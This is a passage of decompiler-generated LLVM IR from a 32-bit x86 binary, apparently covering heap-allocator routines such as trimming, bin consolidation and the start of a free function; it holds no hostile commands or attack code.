  uselistorder i32 %v1_805346e, { 1, 0 }
  uselistorder i32 %v1_805345e, { 0, 2, 1 }
  uselistorder i32 %v0_8053447, { 1, 0 }
  uselistorder i32 %v2_805342e, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 39, 42, 43, 44, 45, 0, 46, 47, 48, 49, 50 }
  uselistorder i32 -32, { 0, 1, 5, 4, 6, 7, 8, 9, 2, 3 }
  uselistorder i32 (i32)* @function_8053949, { 10, 9, 8, 7, 0, 3, 2, 1, 6, 5, 11, 4 }
  uselistorder i32 (i32)* @function_8052b84, { 6, 5, 4, 0, 1, 3, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2 }
  uselistorder label %dec_label_pc_805370a, { 1, 0 }
  uselistorder label %dec_label_pc_8053707, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80536f9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80536ec, { 1, 0 }
  uselistorder label %dec_label_pc_80536a8, { 1, 0 }
  uselistorder label %dec_label_pc_8053695, { 1, 0 }
  uselistorder label %dec_label_pc_805361d, { 1, 0 }
  uselistorder label %dec_label_pc_80535d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80535bc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053515, { 1, 0 }
  uselistorder label %dec_label_pc_8053475, { 1, 0 }
}

define i32 @function_8053714() local_unnamed_addr {
dec_label_pc_8053714:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805371b = load i32, i32* @edx, align 4
  store i32 %v0_805371b, i32* %ebp.global-to-local, align 4
  %v1_805371d = add i32 %v0_805371b, 860
  %v2_805371d = inttoptr i32 %v1_805371d to i32*
  %v3_805371d = load i32, i32* %v2_805371d, align 4
  store i32 %v3_805371d, i32* %ecx.global-to-local, align 4
  %v1_8053723 = add i32 %v0_805371b, 44
  %v2_8053723 = inttoptr i32 %v1_8053723 to i32*
  %v3_8053723 = load i32, i32* %v2_8053723, align 4
  %v1_8053726 = add i32 %v3_8053723, 4
  %v2_8053726 = inttoptr i32 %v1_8053726 to i32*
  %v3_8053726 = load i32, i32* %v2_8053726, align 4
  %v1_8053729 = and i32 %v3_8053726, -4
  store i32 %v1_8053729, i32* @esi, align 4
  %v1_805372e = load i32, i32* @eax, align 4
  %v2_805372e = add i32 %v3_805371d, -17
  %v2_8053730 = add i32 %v2_805372e, %v1_8053729
  %v3_8053730 = sub i32 %v2_8053730, %v1_805372e
  %div = udiv i32 %v3_8053730, %v3_805371d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8053730, %v3_805371d
  store i32 %tmp10, i32* @edx, align 4
  %v1_8053738 = add i32 %div, -1
  %v4_805373b = mul i32 %v1_8053738, %v3_805371d
  store i32 %v4_805373b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805373b, 1
  br i1 %tmp11, label %dec_label_pc_8053797, label %dec_label_pc_8053742

dec_label_pc_8053742:                             ; preds = %dec_label_pc_8053714
  %v1_8053747 = call i32 @function_8054879(i32 0)
  store i32 %v1_8053747, i32* %edi.global-to-local, align 4
  %v0_805374e = load i32, i32* @esi, align 4
  store i32 %v0_805374e, i32* %eax.global-to-local, align 4
  %v1_8053750 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053750 = add i32 %v1_8053750, 44
  %v3_8053750 = inttoptr i32 %v2_8053750 to i32*
  %v4_8053750 = load i32, i32* %v3_8053750, align 4
  %v5_8053750 = add i32 %v4_8053750, %v0_805374e
  store i32 %v5_8053750, i32* %eax.global-to-local, align 4
  %v12_8053756 = icmp eq i32 %v1_8053747, %v5_8053750
  %v1_8053758 = icmp eq i1 %v12_8053756, false
  br i1 %v1_8053758, label %dec_label_pc_8053797, label %dec_label_pc_805375a

dec_label_pc_805375a:                             ; preds = %dec_label_pc_8053742
  %v1_805375d = sub i32 0, %v4_805373b
  store i32 %v1_805375d, i32* @ebx, align 4
  %v1_8053760 = call i32 @function_8054879(i32 %v1_805375d)
  store i32 %v1_8053760, i32* %eax.global-to-local, align 4
  %v1_805376c = call i32 @function_8054879(i32 0)
  store i32 %v1_805376c, i32* %eax.global-to-local, align 4
  %v10_8053774 = icmp eq i32 %v1_805376c, -1
  br i1 %v10_8053774, label %dec_label_pc_8053797, label %dec_label_pc_8053779

dec_label_pc_8053779:                             ; preds = %dec_label_pc_805375a
  %v0_8053779 = load i32, i32* %edi.global-to-local, align 4
  %v2_805377b = sub i32 %v0_8053779, %v1_805376c
  %v12_805377b = icmp eq i32 %v2_805377b, 0
  store i32 %v2_805377b, i32* %ecx.global-to-local, align 4
  br i1 %v12_805377b, label %dec_label_pc_8053797, label %dec_label_pc_805377f

dec_label_pc_805377f:                             ; preds = %dec_label_pc_8053779
  %v0_805377f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805377f = add i32 %v0_805377f, 44
  %v2_805377f = inttoptr i32 %v1_805377f to i32*
  %v3_805377f = load i32, i32* %v2_805377f, align 4
  store i32 %v3_805377f, i32* %eax.global-to-local, align 4
  %v1_8053782 = add i32 %v0_805377f, 872
  %v2_8053782 = inttoptr i32 %v1_8053782 to i32*
  %v3_8053782 = load i32, i32* %v2_8053782, align 4
  %v5_8053782 = sub i32 %v3_8053782, %v2_805377b
  store i32 %v5_8053782, i32* %v2_8053782, align 4
  %v0_8053788 = load i32, i32* @esi, align 4
  %v1_8053788 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053788 = sub i32 %v0_8053788, %v1_8053788
  %v1_805378a = or i32 %v2_8053788, 1
  %v1_805378d = load i32, i32* %eax.global-to-local, align 4
  %v2_805378d = add i32 %v1_805378d, 4
  %v3_805378d = inttoptr i32 %v2_805378d to i32*
  store i32 %v1_805378a, i32* %v3_805378d, align 4
  br label %dec_label_pc_8053799

dec_label_pc_8053797:                             ; preds = %dec_label_pc_8053779, %dec_label_pc_805375a, %dec_label_pc_8053742, %dec_label_pc_8053714
  br label %dec_label_pc_8053799

dec_label_pc_8053799:                             ; preds = %dec_label_pc_805377f, %dec_label_pc_8053797
  %storemerge = phi i32 [ 1, %dec_label_pc_805377f ], [ 0, %dec_label_pc_8053797 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805376c, { 1, 0, 2 }
  uselistorder i32 %v4_805373b, { 1, 2, 0 }
  uselistorder i32 %v3_805371d, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8054879, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053799, { 1, 0 }
}

define i32 @function_80537a1(i32* %arg1) local_unnamed_addr {
dec_label_pc_80537a1:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_80537a2 = load i32, i32* @edi, align 4
  %v0_80537a3 = load i32, i32* @esi, align 4
  %v0_80537a4 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80537ac = load i32, i32* %arg1, align 4
  store i32 %v2_80537ac, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80537b3 = icmp eq i32 %v2_80537ac, 0
  br i1 %v1_80537b3, label %dec_label_pc_80538cd.lr.ph, label %dec_label_pc_80537bb

dec_label_pc_80538cd.lr.ph:                       ; preds = %dec_label_pc_80537a1
  %v3_80538d1 = add i32 %tmp20, 44
  br label %dec_label_pc_80538cd

dec_label_pc_80537bb:                             ; preds = %dec_label_pc_80537a1
  %v1_80537bf = and i32 %v2_80537ac, -3
  store i32 %v1_80537bf, i32* %arg1, align 4
  %v1_80537c4 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_80537cf = add i32 %tmp20, 4
  store i32 %v1_80537cf, i32* %eax.global-to-local, align 4
  %v2_80537da = load i32, i32* %arg1, align 4
  %v2_80537e0 = udiv i32 %v2_80537da, 8
  %v2_80537e3 = mul nuw i32 %v2_80537e0, 4
  %v3_80537e3 = add i32 %tmp20, -4
  %v4_80537e3 = add i32 %v3_80537e3, %v2_80537e3
  store i32 %v4_80537e3, i32* %eax.global-to-local, align 4
  %v2_80538aa = add i32 %tmp20, 44
  %v3_80538aa = inttoptr i32 %v2_80538aa to i32*
  %v1_805387d = add i32 %tmp20, 60
  %v2_805387d = inttoptr i32 %v1_805387d to i32*
  br label %dec_label_pc_80537eb

dec_label_pc_80537eb:                             ; preds = %dec_label_pc_80538c3, %dec_label_pc_80537bb
  %v0_80537f9 = phi i32 [ %v1_80537cf, %dec_label_pc_80537bb ], [ %v4_80538c3, %dec_label_pc_80538c3 ]
  store i32 %v0_80537f9, i32* %eax.global-to-local, align 4
  %v1_80537ef = inttoptr i32 %v0_80537f9 to i32*
  %v2_80537ef = load i32, i32* %v1_80537ef, align 4
  store i32 %v2_80537ef, i32* @ecx, align 4
  %v1_80537f1 = icmp eq i32 %v2_80537ef, 0
  br i1 %v1_80537f1, label %dec_label_pc_80538b9, label %dec_label_pc_80537f9

dec_label_pc_80537f9:                             ; preds = %dec_label_pc_80537eb
  store i32 0, i32* %v1_80537ef, align 4
  %v0_80537ff.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80537ff

dec_label_pc_80537ff:                             ; preds = %dec_label_pc_80538ad, %dec_label_pc_80537f9
  %v0_805381c = phi i32 [ %v3_80537ff, %dec_label_pc_80538ad ], [ %v0_80537ff.pre, %dec_label_pc_80537f9 ]
  %v1_80537ff = add i32 %v0_805381c, 8
  %v2_80537ff = inttoptr i32 %v1_80537ff to i32*
  %v3_80537ff = load i32, i32* %v2_80537ff, align 4
  store i32 %v3_80537ff, i32* %edx.global-to-local, align 4
  %v1_8053806 = add i32 %v0_805381c, 4
  %v2_8053806 = inttoptr i32 %v1_8053806 to i32*
  %v3_8053806 = load i32, i32* %v2_8053806, align 4
  store i32 %v3_8053806, i32* %eax.global-to-local, align 4
  %v1_805380b = and i32 %v3_8053806, -2
  store i32 %v1_805380b, i32* @edi, align 4
  %v2_805380e = urem i32 %v3_8053806, 2
  %v3_805380e = icmp eq i32 %v2_805380e, 0
  %v2_8053810 = add i32 %v1_805380b, %v0_805381c
  store i32 %v2_8053810, i32* @ebx, align 4
  %v1_8053813 = add i32 %v2_8053810, 4
  %v2_8053813 = inttoptr i32 %v1_8053813 to i32*
  %v3_8053813 = load i32, i32* %v2_8053813, align 4
  store i32 %v3_8053813, i32* %edx.global-to-local, align 4
  %v1_805381a = icmp eq i1 %v3_805380e, false
  br i1 %v1_805381a, label %dec_label_pc_805383c, label %dec_label_pc_805381c

dec_label_pc_805381c:                             ; preds = %dec_label_pc_80537ff
  %v1_805381c = inttoptr i32 %v0_805381c to i32*
  %v2_805381c = load i32, i32* %v1_805381c, align 4
  store i32 %v2_805381c, i32* %ebp.global-to-local, align 4
  %v2_8053820 = sub i32 %v0_805381c, %v2_805381c
  store i32 %v2_8053820, i32* %eax.global-to-local, align 4
  %v1_8053822 = add i32 %v2_8053820, 8
  %v2_8053822 = inttoptr i32 %v1_8053822 to i32*
  %v3_8053822 = load i32, i32* %v2_8053822, align 4
  store i32 %v3_8053822, i32* @esi, align 4
  %v1_8053825 = add i32 %v2_8053820, 12
  %v2_8053825 = inttoptr i32 %v1_8053825 to i32*
  %v3_8053825 = load i32, i32* %v2_8053825, align 4
  store i32 %v3_8053825, i32* %edx.global-to-local, align 4
  %v1_8053828 = add i32 %v3_8053822, 12
  %v2_8053828 = inttoptr i32 %v1_8053828 to i32*
  %v3_8053828 = load i32, i32* %v2_8053828, align 4
  store i32 %v3_8053828, i32* @ecx, align 4
  %v12_805382b = icmp eq i32 %v3_8053828, %v2_8053820
  %v1_805382d = icmp eq i1 %v12_805382b, false
  br i1 %v1_805382d, label %dec_label_pc_805386c, label %dec_label_pc_805382f

dec_label_pc_805382f:                             ; preds = %dec_label_pc_805381c
  %v1_805382f = add i32 %v3_8053825, 8
  %v2_805382f = inttoptr i32 %v1_805382f to i32*
  %v3_805382f = load i32, i32* %v2_805382f, align 4
  %v15_805382f = icmp eq i32 %v3_805382f, %v3_8053828
  %v1_8053832 = icmp eq i1 %v15_805382f, false
  br i1 %v1_8053832, label %dec_label_pc_805386c, label %dec_label_pc_8053834

dec_label_pc_8053834:                             ; preds = %dec_label_pc_805382f
  %v2_8053834 = add i32 %v2_805381c, %v1_805380b
  store i32 %v2_8053834, i32* @edi, align 4
  store i32 %v3_8053825, i32* %v2_8053828, align 4
  %v0_8053839 = load i32, i32* @esi, align 4
  %v1_8053839 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053839 = add i32 %v1_8053839, 8
  %v3_8053839 = inttoptr i32 %v2_8053839 to i32*
  store i32 %v0_8053839, i32* %v3_8053839, align 4
  %v0_8053847.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805383c

dec_label_pc_805383c:                             ; preds = %dec_label_pc_80537ff, %dec_label_pc_8053834
  %v1_8053850 = phi i32 [ %v2_8053810, %dec_label_pc_80537ff ], [ %v0_8053847.pre, %dec_label_pc_8053834 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8053844 = and i32 %v3_8053813, -4
  store i32 %v1_8053844, i32* %ebp.global-to-local, align 4
  %v4_8053847 = load i32, i32* %v3_80538aa, align 4
  %v15_8053847 = icmp eq i32 %v1_8053850, %v4_8053847
  br i1 %v15_8053847, label %dec_label_pc_805389d, label %dec_label_pc_805384c

dec_label_pc_805384c:                             ; preds = %dec_label_pc_805383c
  %v2_805384c = add i32 %v1_8053850, 4
  %v3_805384c = add i32 %v2_805384c, %v1_8053844
  %v4_805384c = inttoptr i32 %v3_805384c to i32*
  %v5_805384c = load i32, i32* %v4_805384c, align 4
  store i32 %v5_805384c, i32* %eax.global-to-local, align 4
  %v3_8053850 = inttoptr i32 %v2_805384c to i32*
  store i32 %v1_8053844, i32* %v3_8053850, align 4
  %v0_8053853 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053853 = urem i32 %v0_8053853, 2
  %v2_8053853 = icmp eq i32 %v1_8053853, 0
  store i32 %v1_8053853, i32* %eax.global-to-local, align 4
  %v1_8053858 = icmp eq i1 %v2_8053853, false
  br i1 %v1_8053858, label %dec_label_pc_8053879, label %dec_label_pc_805385a

dec_label_pc_805385a:                             ; preds = %dec_label_pc_805384c
  %v0_805385a = load i32, i32* @ebx, align 4
  %v1_805385a = add i32 %v0_805385a, 8
  %v2_805385a = inttoptr i32 %v1_805385a to i32*
  %v3_805385a = load i32, i32* %v2_805385a, align 4
  store i32 %v3_805385a, i32* @edx, align 4
  %v1_805385d = add i32 %v0_805385a, 12
  %v2_805385d = inttoptr i32 %v1_805385d to i32*
  %v3_805385d = load i32, i32* %v2_805385d, align 4
  store i32 %v3_805385d, i32* %eax.global-to-local, align 4
  %v1_8053860 = add i32 %v3_805385a, 12
  %v2_8053860 = inttoptr i32 %v1_8053860 to i32*
  %v3_8053860 = load i32, i32* %v2_8053860, align 4
  store i32 %v3_8053860, i32* @esi, align 4
  %v12_8053863 = icmp eq i32 %v3_8053860, %v0_805385a
  %v1_8053865 = icmp eq i1 %v12_8053863, false
  br i1 %v1_8053865, label %dec_label_pc_805386c, label %dec_label_pc_8053867

dec_label_pc_8053867:                             ; preds = %dec_label_pc_805385a
  %v1_8053867 = add i32 %v3_805385d, 8
  %v2_8053867 = inttoptr i32 %v1_8053867 to i32*
  %v3_8053867 = load i32, i32* %v2_8053867, align 4
  %v15_8053867 = icmp eq i32 %v3_8053867, %v3_8053860
  br i1 %v15_8053867, label %dec_label_pc_8053871, label %dec_label_pc_805386c

dec_label_pc_805386c:                             ; preds = %dec_label_pc_8053867, %dec_label_pc_805385a, %dec_label_pc_805382f, %dec_label_pc_805381c
  %v0_805386c = call i32 @function_8053ae5()
  store i32 %v0_805386c, i32* %eax.global-to-local, align 4
  %v1_8053873.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053871

dec_label_pc_8053871:                             ; preds = %dec_label_pc_8053867, %dec_label_pc_805386c
  %v1_8053873 = phi i32 [ %v3_805385a, %dec_label_pc_8053867 ], [ %v1_8053873.pre, %dec_label_pc_805386c ]
  %v0_8053873 = phi i32 [ %v3_805385d, %dec_label_pc_8053867 ], [ %v0_805386c, %dec_label_pc_805386c ]
  %v0_8053871 = load i32, i32* @edi, align 4
  %v1_8053871 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053871 = add i32 %v1_8053871, %v0_8053871
  store i32 %v2_8053871, i32* @edi, align 4
  %v2_8053873 = add i32 %v1_8053873, 12
  %v3_8053873 = inttoptr i32 %v2_8053873 to i32*
  store i32 %v0_8053873, i32* %v3_8053873, align 4
  %v0_8053876 = load i32, i32* @edx, align 4
  %v1_8053876 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053876 = add i32 %v1_8053876, 8
  %v3_8053876 = inttoptr i32 %v2_8053876 to i32*
  store i32 %v0_8053876, i32* %v3_8053876, align 4
  br label %dec_label_pc_8053879

dec_label_pc_8053879:                             ; preds = %dec_label_pc_805384c, %dec_label_pc_8053871
  store i32 %v1_80537c4, i32* %eax.global-to-local, align 4
  %v3_805387d = load i32, i32* %v2_805387d, align 4
  store i32 %v3_805387d, i32* @edx, align 4
  %v0_8053880 = load i32, i32* @ecx, align 4
  store i32 %v0_8053880, i32* %v2_805387d, align 4
  %v0_8053883 = load i32, i32* @edi, align 4
  %v1_8053885 = or i32 %v0_8053883, 1
  store i32 %v1_8053885, i32* %eax.global-to-local, align 4
  %v0_8053888 = load i32, i32* @ecx, align 4
  %v1_8053888 = load i32, i32* @edx, align 4
  %v2_8053888 = add i32 %v1_8053888, 12
  %v3_8053888 = inttoptr i32 %v2_8053888 to i32*
  store i32 %v0_8053888, i32* %v3_8053888, align 4
  %v0_805388b = load i32, i32* %eax.global-to-local, align 4
  %v1_805388b = load i32, i32* @ecx, align 4
  %v2_805388b = add i32 %v1_805388b, 4
  %v3_805388b = inttoptr i32 %v2_805388b to i32*
  store i32 %v0_805388b, i32* %v3_805388b, align 4
  store i32 %v1_80537c4, i32* %eax.global-to-local, align 4
  %v0_8053892 = load i32, i32* @edx, align 4
  %v1_8053892 = load i32, i32* @ecx, align 4
  %v2_8053892 = add i32 %v1_8053892, 8
  %v3_8053892 = inttoptr i32 %v2_8053892 to i32*
  store i32 %v0_8053892, i32* %v3_8053892, align 4
  %v0_8053895 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053895 = load i32, i32* @ecx, align 4
  %v2_8053895 = add i32 %v1_8053895, 12
  %v3_8053895 = inttoptr i32 %v2_8053895 to i32*
  store i32 %v0_8053895, i32* %v3_8053895, align 4
  %v0_8053898 = load i32, i32* @edi, align 4
  %v1_8053898 = load i32, i32* @ecx, align 4
  %v3_8053898 = add i32 %v1_8053898, %v0_8053898
  %v4_8053898 = inttoptr i32 %v3_8053898 to i32*
  store i32 %v0_8053898, i32* %v4_8053898, align 4
  br label %dec_label_pc_80538ad

dec_label_pc_805389d:                             ; preds = %dec_label_pc_805383c
  %v0_805389d = load i32, i32* @edi, align 4
  %v2_805389d = add i32 %v0_805389d, %v1_8053844
  %v1_80538a0 = or i32 %v2_805389d, 1
  store i32 %v1_80538a0, i32* %eax.global-to-local, align 4
  %v1_80538a3 = load i32, i32* @ecx, align 4
  %v2_80538a3 = add i32 %v1_80538a3, 4
  %v3_80538a3 = inttoptr i32 %v2_80538a3 to i32*
  store i32 %v1_80538a0, i32* %v3_80538a3, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_80538aa = load i32, i32* @ecx, align 4
  store i32 %v0_80538aa, i32* %v3_80538aa, align 4
  br label %dec_label_pc_80538ad

dec_label_pc_80538ad:                             ; preds = %dec_label_pc_8053879, %dec_label_pc_805389d
  store i32 %v3_80537ff, i32* @ecx, align 4
  %v1_80538b1 = icmp eq i32 %v3_80537ff, 0
  %v1_80538b3 = icmp eq i1 %v1_80538b1, false
  br i1 %v1_80538b3, label %dec_label_pc_80537ff, label %dec_label_pc_80538b9

dec_label_pc_80538b9:                             ; preds = %dec_label_pc_80538ad, %dec_label_pc_80537eb
  %v15_80538bd = icmp eq i32 %v0_80537f9, %v4_80537e3
  br i1 %v15_80538bd, label %dec_label_pc_8053941, label %dec_label_pc_80538c3

dec_label_pc_80538c3:                             ; preds = %dec_label_pc_80538b9
  %v4_80538c3 = add i32 %v0_80537f9, 4
  br label %dec_label_pc_80537eb

dec_label_pc_80538cd:                             ; preds = %dec_label_pc_80538cd.lr.ph, %dec_label_pc_80538cd
  %v1_80538d1 = phi i32 [ 1, %dec_label_pc_80538cd.lr.ph ], [ %v0_80538dc, %dec_label_pc_80538cd ]
  %v2_80538d1 = mul i32 %v1_80538d1, 8
  %v4_80538d1 = add i32 %v3_80538d1, %v2_80538d1
  store i32 %v4_80538d1, i32* %eax.global-to-local, align 4
  %v1_80538d5 = add i32 %v1_80538d1, 1
  store i32 %v1_80538d5, i32* %edx.global-to-local, align 4
  %v2_80538d6 = add i32 %v4_80538d1, 12
  %v3_80538d6 = inttoptr i32 %v2_80538d6 to i32*
  store i32 %v4_80538d1, i32* %v3_80538d6, align 4
  %v0_80538d9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80538d9 = add i32 %v0_80538d9, 8
  %v3_80538d9 = inttoptr i32 %v2_80538d9 to i32*
  store i32 %v0_80538d9, i32* %v3_80538d9, align 4
  %v0_80538dc = load i32, i32* %edx.global-to-local, align 4
  %v7_80538df = icmp sgt i32 %v0_80538dc, 95
  br i1 %v7_80538df, label %dec_label_pc_80538e1, label %dec_label_pc_80538cd

dec_label_pc_80538e1:                             ; preds = %dec_label_pc_80538cd
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80538e5 = add i32 %tmp20, 864
  %v2_80538e5 = inttoptr i32 %v1_80538e5 to i32*
  %v3_80538e5 = load i32, i32* %v2_80538e5, align 4
  %v4_80538e5 = or i32 %v3_80538e5, 1
  store i32 %v4_80538e5, i32* %v2_80538e5, align 4
  %v0_80538ec = load i32, i32* %eax.global-to-local, align 4
  %v1_80538ec = add i32 %v0_80538ec, 840
  %v2_80538ec = inttoptr i32 %v1_80538ec to i32*
  store i32 0, i32* %v2_80538ec, align 4
  %v0_80538f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538f6 = add i32 %v0_80538f6, 852
  %v2_80538f6 = inttoptr i32 %v1_80538f6 to i32*
  store i32 65536, i32* %v2_80538f6, align 4
  %v0_8053900 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053900 = add i32 %v0_8053900, 844
  %v2_8053900 = inttoptr i32 %v1_8053900 to i32*
  store i32 262144, i32* %v2_8053900, align 4
  %v0_805390a = load i32, i32* %eax.global-to-local, align 4
  %v1_805390a = add i32 %v0_805390a, 836
  %v2_805390a = inttoptr i32 %v1_805390a to i32*
  store i32 262144, i32* %v2_805390a, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_805391b = load i32, i32* %arg1, align 4
  %v1_805391d = urem i32 %v2_805391b, 4
  %v1_8053920 = or i32 %v1_805391d, 72
  store i32 %v1_8053920, i32* %arg1, align 4
  %v0_8053925 = load i32, i32* @edx, align 4
  %v1_8053927 = add i32 %v0_8053925, 52
  store i32 %v1_8053927, i32* %eax.global-to-local, align 4
  %v2_805392a = add i32 %v0_8053925, 44
  %v3_805392a = inttoptr i32 %v2_805392a to i32*
  store i32 %v1_8053927, i32* %v3_805392a, align 4
  %v1_805392f = call i32 @function_8053f29(i32 30)
  store i32 %v1_805392f, i32* %eax.global-to-local, align 4
  %v2_805393b = add i32 %tmp20, 860
  %v3_805393b = inttoptr i32 %v2_805393b to i32*
  store i32 %v1_805392f, i32* %v3_805393b, align 4
  br label %dec_label_pc_8053941

dec_label_pc_8053941:                             ; preds = %dec_label_pc_80538b9, %dec_label_pc_80538e1
  store i32 %v0_80537a4, i32* @ebx, align 4
  store i32 %v0_80537a3, i32* @esi, align 4
  store i32 %v0_80537a2, i32* @edi, align 4
  %v0_8053948 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053948

; uselistorder directives
  uselistorder i32 %v0_80538dc, { 1, 0 }
  uselistorder i32 %v0_80538d9, { 1, 0 }
  uselistorder i32 %v1_80538d1, { 1, 0 }
  uselistorder i32 %v0_8053898, { 1, 0 }
  uselistorder i32 %v1_8053853, { 1, 0 }
  uselistorder i32 %v2_805384c, { 1, 0 }
  uselistorder i32 %v1_8053844, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053850, { 1, 0 }
  uselistorder i32 %v3_80537ff, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805381c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80537f9, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80538aa, { 1, 0 }
  uselistorder i32 %v1_80537c4, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_8053941, { 1, 0 }
  uselistorder label %dec_label_pc_80538cd, { 1, 0 }
  uselistorder label %dec_label_pc_80538ad, { 1, 0 }
  uselistorder label %dec_label_pc_8053879, { 1, 0 }
  uselistorder label %dec_label_pc_8053871, { 1, 0 }
  uselistorder label %dec_label_pc_805383c, { 1, 0 }
}

define i32 @function_8053949(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053949:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053949 = load i32, i32* @ebp, align 4
  %v0_805394a = load i32, i32* @edi, align 4
  %v0_805394b = load i32, i32* @esi, align 4
  %v0_805394c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053954 = icmp eq i32 %arg1, 0
  br i1 %v1_8053954, label %dec_label_pc_8053add, label %dec_label_pc_805395c

dec_label_pc_805395c:                             ; preds = %dec_label_pc_8053949
  %v2_8053967 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053967, i32* @eax, align 4
  %v2_805396c = call i32 @function_80540b0(i32 %v2_8053967, i32 134561965)
  store i32 %v2_805396c, i32* %eax.global-to-local, align 4
  %v1_8053978 = call i32 @function_80540ad(i32 ptrtoint (i32* @global_var_8056820.205 to i32))
  %v1_805397d = add i32 %arg1, -8
  store i32 %v1_805397d, i32* @ecx, align 4
  %v0_8053980 = load i8, i8* @global_var_8056bc0.206, align 1
  %v1_8053980 = sext i8 %v0_8053980 to i32
  store i32 %v1_8053980, i32* %eax.global-to-local, align 4
  %v1_8053988 = add i32 %arg1, -4
  %v2_8053988 = inttoptr i32 %v1_8053988 to i32*
  %v3_8053988 = load i32, i32* %v2_8053988, align 4
  %v1_805398d = and i32 %v3_8053988, -4
  %v4_805398d = trunc i32 %v1_805398d to i8
  store i32 %v1_805398d, i32* @ebx, align 4
  %v8_8053992 = icmp ugt i8 %v4_805398d, %v0_8053980
  br i1 %v8_8053992, label %dec_label_pc_80539b4, label %dec_label_pc_8053994

dec_label_pc_8053994:                             ; preds = %dec_label_pc_805395c
  %v2_8053994 = udiv i32 %v3_8053988, 8
  %v1_8053997 = or i32 %v1_8053980, 3
  %v3_8053997 = trunc i32 %v1_8053997 to i8
  store i32 %v1_8053997, i32* %eax.global-to-local, align 4
  store i8 %v3_8053997, i8* @global_var_8056bc0.206, align 64
  %v1_805399f = mul nuw i32 %v2_8053994, 4
  %v2_805399f = add i32 %v1_805399f, ptrtoint (i8* @global_var_8056bc0.206 to i32)
  store i32 %v2_805399f, i32* @edx, align 4
  %v1_80539a6 = add i32 %v1_805399f, add (i32 ptrtoint (i8* @global_var_8056bc0.206 to i32), i32 -4)
  %v2_80539a6 = inttoptr i32 %v1_80539a6 to i32*
  %v3_80539a6 = load i32, i32* %v2_80539a6, align 4
  store i32 %v3_80539a6, i32* %eax.global-to-local, align 4
  %v3_80539a9 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80539a6, i32* %v3_80539a9, align 4
  %v0_80539ac = load i32, i32* @ecx, align 4
  %v1_80539ac = load i32, i32* @edx, align 4
  %v2_80539ac = add i32 %v1_80539ac, -4
  %v3_80539ac = inttoptr i32 %v2_80539ac to i32*
